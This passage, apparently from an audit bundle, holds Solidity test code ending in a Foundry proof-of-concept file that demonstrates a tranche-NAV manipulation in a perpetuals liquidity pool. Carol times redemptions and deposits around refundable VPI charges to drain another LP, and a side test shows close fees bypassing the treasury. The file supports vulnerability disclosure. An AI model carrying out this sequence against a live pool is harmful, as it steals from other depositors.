        assertEq(size, 2_000 * ONE_LOT, "open executed");
        assertGt(margin, 0);

        _advance(100);
        uint64 closeId = _commitClose(alice, CfdTypes.Side.SHORT, 2_000 * ONE_LOT, 1);
        _executeHead(keeper, 1e8);
        (size,,) = _position(alice);
        assertEq(size, 0, "closed");
        assertEq(router.nextExecuteId(), 0, "queue drained");
        assertEq(closeId, 2);

        address[] memory accts = new address[](6);
        accts[0] = alice; accts[1] = bob; accts[2] = carol; accts[3] = keeper; accts[4] = address(this);
        accts[5] = engine.protocolTreasury();
        _assertClearinghouseLedger(accts);
        address[] memory wallets = new address[](5);
        wallets[0] = alice; wallets[1] = bob; wallets[2] = carol; wallets[3] = keeper; wallets[4] = address(this);
        _assertTokenConservation(wallets);
    }

}
```

### File 2: `packages/perps/test/perps/poc/VpiNavPump.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// H-VPI-NAV: a Junior LP pumps tranche NAV with a refundable VPI charge across an LP epoch settlement.
//   1. carol holds Junior shares and has a matured redeem request
//   2. carol opens a large skew-increasing position -> pays VPI X, booked as LP revenue (accountedAssets += X)
//   3. carol settles the LP epoch -> her redemption is priced with X included
//   4. carol closes the position -> the pool pays X back as a rebate (accountedAssets -= X)
//   => bob (the other Junior LP) is left holding the hole; carol captured share * X.
// Run: tools/poc-run.sh VpiNavPump.t.sol

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {PocBase} from "./PocHarness.t.sol";

abstract contract VpiNavPumpBase is PocBase {

    struct Cycle {
        uint256 vpiPaid;
        uint256 redemption;
        uint256 carolFair;
        int256 tradingPnl;
        uint256 rebatePaid;
    }

    /// @dev carol: queue full redemption -> pump -> settle -> close. Returns the cycle economics.
    function _pumpCycle(uint256 skewPct) internal returns (Cycle memory c) {
        uint256 carolShares = juniorVault.balanceOf(carol);
        c.carolFair = _lpValue(juniorVault, carol);

        vm.prank(carol);
        uint256 requestId = juniorVault.requestRedeem(carolShares, carol, carol);
        uint256 epochStart = pool.lpEpochStart(requestId);

        // shortly before maturity: open the pump position (skew-increasing LONG, `skewPct` of depth)
        vm.warp(epochStart - 120);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(1e8);
        uint256 depth = pool.totalAssets();
        uint256 lots = (depth * skewPct / 100) / 1e8;
        uint256 size = lots * ONE_LOT;
        uint256 margin = lots * 1e8 / 100; // 1% of notional
        uint256 poolBefore = pool.accountedAssets();
        uint256 carolCashBefore = clearinghouse.balanceAssets(carol);
        _commitV3(carol, CfdTypes.Side.LONG, size, margin, 1, false);
        _executeHead(keeper, 1e8);
        (uint256 posSize,,) = _position(carol);
        assertEq(posSize, size, "pump position open");
        c.vpiPaid = pool.accountedAssets() - poolBefore;

        // maturity: carol settles the epoch herself; redemption priced with the VPI revenue included
        vm.warp(epochStart + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _settleEpochs(1e8);
        c.redemption = juniorVault.claimableRedeemAssets(requestId, carol);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, carol);
        vm.prank(carol);
        juniorVault.claimRedeem(requestId, claimableShares, carol, carol);

        // unwind: close, pool refunds the VPI as an action rebate
        _advance(5);
        uint256 poolBeforeClose = pool.accountedAssets();
        _commitV3(carol, CfdTypes.Side.LONG, size, 0, 2e8, true);
        _executeHead(keeper, 1e8);
        (posSize,,) = _position(carol);
        assertEq(posSize, 0, "pump position closed");
        c.rebatePaid = poolBeforeClose - pool.accountedAssets();
        c.tradingPnl = int256(clearinghouse.balanceAssets(carol)) - int256(carolCashBefore);
    }

    function _redeposit(address lp, uint256 assets) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        uint256 requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _settleEpochs(1e8);
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _log(string memory tag, Cycle memory c, uint256 bobBefore) internal {
        emit log_string(tag);
        emit log_named_uint("  VPI booked as LP revenue   ", c.vpiPaid);
        emit log_named_uint("  rebate paid out of the pool", c.rebatePaid);
        emit log_named_int("  carol redemption - fair    ", int256(c.redemption) - int256(c.carolFair));
        emit log_named_int("  carol trading P&L (fees)   ", c.tradingPnl);
        emit log_named_int("  carol net                  ", int256(c.redemption) - int256(c.carolFair) + c.tradingPnl);
        emit log_named_int("  bob junior value delta     ", int256(_lpValue(juniorVault, bob)) - int256(bobBefore));
    }

}

/// Junior-only pool: carol 2M vs bob 1M (carol holds 2/3 of the tranche).
contract VpiNavPumpTest is VpiNavPumpBase {

    function setUp() public override {
        super.setUp();
        _fundJunior(carol, 2_000_000e6);
        _advance(1 hours + 1); // activation cooldown
        _refreshMark(1e8);
    }

    /// No trading needed: carol only times her redemption around an organic skew-increasing open by alice.
    function test_ParasiticRedeemAroundOrganicOpen() external {
        uint256 bobBefore = _lpValue(juniorVault, bob);
        // carol exits half her stake (1M of 2M): the full 2M would exceed the free budget once alice reserves 1.17M
        uint256 carolShares = juniorVault.balanceOf(carol) / 2;
        uint256 carolFair = _lpValue(juniorVault, carol) / 2;
        vm.prank(carol);
        uint256 requestId = juniorVault.requestRedeem(carolShares, carol, carol);
        uint256 epochStart = pool.lpEpochStart(requestId);

        // alice (unrelated trader) opens 39% skew shortly before maturity -> VPI booked as LP revenue
        vm.warp(epochStart - 120);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(1e8);
        uint256 depth = pool.totalAssets();
        uint256 lots = (depth * 39 / 100) / 1e8;
        uint256 size = lots * ONE_LOT;
        uint256 poolBefore = pool.accountedAssets();
        _commitV3(alice, CfdTypes.Side.LONG, size, lots * 1e8 / 100, 1, false);
        _executeHead(keeper, 1e8);
        uint256 vpi = pool.accountedAssets() - poolBefore;

        vm.warp(epochStart + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _settleEpochs(1e8);
        uint256 redemption = juniorVault.claimableRedeemAssets(requestId, carol);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, carol);
        vm.prank(carol);
        juniorVault.claimRedeem(requestId, claimable, carol, carol);

        // later alice closes: the rebate is paid out of the pool bob now owns alone
        _advance(5);
        _commitV3(alice, CfdTypes.Side.LONG, size, 0, 2e8, true);
        _executeHead(keeper, 1e8);

        emit log_named_decimal_uint("VPI booked by alice's open                 ", vpi, 6);
        emit log_named_decimal_int("carol redemption - fair (carol never trades)", int256(redemption) - int256(carolFair), 6);
        emit log_named_decimal_int("bob value delta                            ", int256(_lpValue(juniorVault, bob)) - int256(bobBefore), 6);
        assertGt(redemption, carolFair, "carol captures her share of alice's refundable VPI");
    }

    function test_VpiRevenuePumpsNavForRedeemer() public {
        uint256 bobBefore = _lpValue(juniorVault, bob);
        Cycle memory c = _pumpCycle(30);
        _log("single cycle, 30% skew, carol 2/3 of junior", c, bobBefore);
        assertLt(_lpValue(juniorVault, bob), bobBefore, "bob must have lost value to the pump");
        assertGt(int256(c.redemption) - int256(c.carolFair) + c.tradingPnl, 0, "carol must profit");
    }

    /// Side observation (H-FEE-REBATE-NET): when a close nets a VPI rebate, the 4 bps execution fee is deducted from
    /// the rebate and stays in the pool as LP revenue; the protocol treasury is credited nothing.
    function test_CloseFeeNettedIntoRebateIsNotCreditedToTreasury() public {
        address treasury = engine.protocolTreasury();
        _refreshMark(1e8);
        uint256 lots = (pool.totalAssets() * 30 / 100) / 1e8;
        uint256 size = lots * ONE_LOT;
        _commitV3(carol, CfdTypes.Side.LONG, size, lots * 1e8 / 100, 1, false);
        _executeHead(keeper, 1e8);
        uint256 treasuryAfterOpen = clearinghouse.balanceAssets(treasury);
        emit log_named_uint("treasury credited at open (4 bps fee)", treasuryAfterOpen);
        assertEq(treasuryAfterOpen, lots * 1e8 * 4 / 10_000, "open fee credited to treasury");

        _advance(5);
        uint256 poolBefore = pool.accountedAssets();
        _commitV3(carol, CfdTypes.Side.LONG, size, 0, 2e8, true);
        _executeHead(keeper, 1e8);
        uint256 rebate = poolBefore - pool.accountedAssets();
        uint256 expectedFee = lots * 1e8 * 4 / 10_000;
        emit log_named_uint("rebate paid at close", rebate);
        emit log_named_uint("close fee implied by the netting", expectedFee);
        emit log_named_uint("treasury credited at close", clearinghouse.balanceAssets(treasury) - treasuryAfterOpen);
        assertEq(clearinghouse.balanceAssets(treasury), treasuryAfterOpen, "no protocol fee credited on a rebate close");
    }

    /// Sensitivity to Pyth confidence: every tick now carries a confidence and the oracle shifts both execution
    /// prices against the trader by 25% of it (production multiplier). 2 bps is a typical FX confidence.
    function test_PumpWithTypicalConfidence_2bps() public {
        tickConf = 20_000; // 2 bps of 1.00
        _refreshMark(1e8);
        uint256 bobBefore = _lpValue(juniorVault, bob);
        Cycle memory c = _pumpCycle(30);
        _log("single cycle, 30% skew, 2 bps confidence (25% adverse shift)", c, bobBefore);
        assertLt(_lpValue(juniorVault, bob), bobBefore);
        assertGt(int256(c.redemption) - int256(c.carolFair) + c.tradingPnl, 0, "still profitable at 2 bps");
    }

    /// 10 bps is the maximum basket confidence the oracle accepts (`basketMaxConfidenceRatioBps` = 10).
    function test_PumpWithMaxAllowedConfidence_10bps() public {
        tickConf = 100_000; // 10 bps of 1.00
        _refreshMark(1e8);
        uint256 bobBefore = _lpValue(juniorVault, bob);
        Cycle memory c = _pumpCycle(30);
        _log("single cycle, 30% skew, 10 bps confidence (25% adverse shift)", c, bobBefore);
        assertLt(_lpValue(juniorVault, bob), bobBefore, "victim still loses even if the attacker does not profit");
    }

    function test_RepeatedCyclesDrainMinorityJunior() public {
        uint256 bobStart = _lpValue(juniorVault, bob);
        int256 carolTotal;
        for (uint256 i; i < 4; ++i) {
            uint256 bobBefore = _lpValue(juniorVault, bob);
            // 30% skew keeps the redemption inside the free-asset budget (P - L - B) so it is fully funded
            Cycle memory c = _pumpCycle(30);
            assertEq(juniorVault.balanceOf(carol), 0, "redemption must be fully funded for a clean cycle");
            _log(string.concat("cycle ", vm.toString(i + 1), " (30% skew)"), c, bobBefore);
            carolTotal += int256(c.redemption) - int256(c.carolFair) + c.tradingPnl;
            // carol re-enters for the next cycle with her redemption proceeds
            _redeposit(carol, c.redemption);
            _advance(1 hours + 1);
            _refreshMark(1e8);
        }
        emit log_named_int("carol total net after 4 cycles", carolTotal);
        emit log_named_int("bob total delta after 4 cycles", int256(_lpValue(juniorVault, bob)) - int256(bobStart));
        assertLt(_lpValue(juniorVault, bob), bobStart);
        assertGt(carolTotal, 0);
    }

}

/// Senior-heavy pool: Senior 400k (bob), Junior 100k bob + 100k carol (2/3 Senior; the release 80 % Senior cap also
/// caps Junior exits so remaining Junior >= Senior/4). Senior takes no trading revenue, so the whole pump accrues to
/// Junior and carol only needs 50% of the *junior* tranche (~17% of pool depth) to profit.
contract VpiNavPumpSeniorTest is VpiNavPumpBase {

    function _bobJunior() internal pure override returns (uint256) { return 100_000e6; }

    function setUp() public override {
        super.setUp();
        // zero the senior coupon so the measurement is not blurred by junior->senior coupon drift over the test clock
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.seniorRateBps = 0;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        _skipClosedMarket(); // the 72 h timelock can land on the weekend closure
        _refreshMark(1e8);
        pool.finalizePoolConfig();

        // Release Senior limits (80 % share -> Senior <= 4 x Junior, and Junior exits are capped so the remaining Junior
        // still backs Senior). Fund carol's Junior first, then a 400k Senior (2/3 of the pool): after carol redeems her
        // 100k Junior the remaining ~101k Junior still satisfies the 4:1 covenant for 400k Senior.
        _fundJunior(carol, 100_000e6);
        _fundSenior(bob, 400_000e6);
        _advance(1 hours + 1);
        _refreshMark(1e8);
    }

    function test_SeniorHeavyPool_JuniorMinorityDrained() public {
        uint256 bobJuniorBefore = _lpValue(juniorVault, bob);
        uint256 bobSeniorBefore = _lpValue(seniorVault, bob);
        emit log_named_uint("pool depth", pool.totalAssets());
        Cycle memory c = _pumpCycle(39);
        _log("single cycle, 39% skew, senior-heavy pool", c, bobJuniorBefore);
        emit log_named_int("bob senior value delta     ", int256(_lpValue(seniorVault, bob)) - int256(bobSeniorBefore));
        assertLt(_lpValue(juniorVault, bob), bobJuniorBefore, "junior minority must lose");
        assertGt(int256(c.redemption) - int256(c.carolFair) + c.tradingPnl, 0, "carol must profit");
    }

}

/// Deposit-side mirror with organic skew: alice (unrelated trader) holds a LONG; carol depresses NAV with a
/// skew-reducing SHORT (rebate paid from the pool) right before her Junior deposit activates, then closes and the
/// clawback restores NAV - now mostly owned by carol.
contract VpiNavPumpDepositTest is VpiNavPumpBase {

    function setUp() public override {
        super.setUp();
        _refreshMark(1e8);
        // organic skew: alice opens LONG 39% of depth and keeps it
        uint256 lots = (pool.totalAssets() * 39 / 100) / 1e8;
        _commitV3(alice, CfdTypes.Side.LONG, lots * ONE_LOT, lots * 1e8 / 100, 1, false);
        _executeHead(keeper, 1e8);
        _advance(60);
    }

    function test_DepositActivationAtDepressedNav() public {
        uint256 bobBefore = _lpValue(juniorVault, bob);
        emit log_named_uint("bob junior value before (incl. alice's VPI revenue)", bobBefore);

        // carol funds a 2M junior deposit request
        settlementToken.mint(carol, 2_000_000e6);
        vm.startPrank(carol);
        settlementToken.approve(address(juniorVault), 2_000_000e6);
        uint256 requestId = juniorVault.requestDeposit(2_000_000e6, carol, carol);
        vm.stopPrank();
        uint256 epochStart = pool.lpEpochStart(requestId);

        // shortly before activation: carol flattens the skew with a SHORT -> pool pays her a VPI rebate (NAV down)
        vm.warp(epochStart - 120);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(1e8);
        (uint256 aliceSize,,) = _position(alice);
        uint256 poolBefore = pool.accountedAssets();
        uint256 carolCashBefore = clearinghouse.balanceAssets(carol);
        _commitV3(carol, CfdTypes.Side.SHORT, aliceSize, aliceSize / ONE_LOT * 1e8 / 100, 2e8, false);
        _executeHead(keeper, 1e8);
        uint256 rebate = poolBefore - pool.accountedAssets();
        emit log_named_uint("rebate paid by the pool at carol's open", rebate);
        assertGt(rebate, 0, "skew-reducing open must receive a rebate from pool cash");

        // activation at the depressed NAV
        vm.warp(epochStart + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _settleEpochs(1e8);
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, carol);
        vm.prank(carol);
        juniorVault.claimDeposit(requestId, claimableAssets, carol, carol);

        // unwind: close the SHORT -> clawback returns the rebate to the pool, now 2/3 owned by carol
        _advance(5);
        _commitV3(carol, CfdTypes.Side.SHORT, aliceSize, 0, 1, true);
        _executeHead(keeper, 1e8);
        int256 tradingPnl = int256(clearinghouse.balanceAssets(carol)) - int256(carolCashBefore);
        uint256 carolValue = _lpValue(juniorVault, carol);
        emit log_named_int("carol trading P&L (fees)   ", tradingPnl);
        emit log_named_int("carol share value - deposit", int256(carolValue) - int256(2_000_000e6));
        emit log_named_int("carol net                  ", int256(carolValue) - int256(2_000_000e6) + tradingPnl);
        emit log_named_int("bob junior value delta     ", int256(_lpValue(juniorVault, bob)) - int256(bobBefore));
        assertLt(_lpValue(juniorVault, bob), bobBefore, "bob must have lost value");
    }

}
```

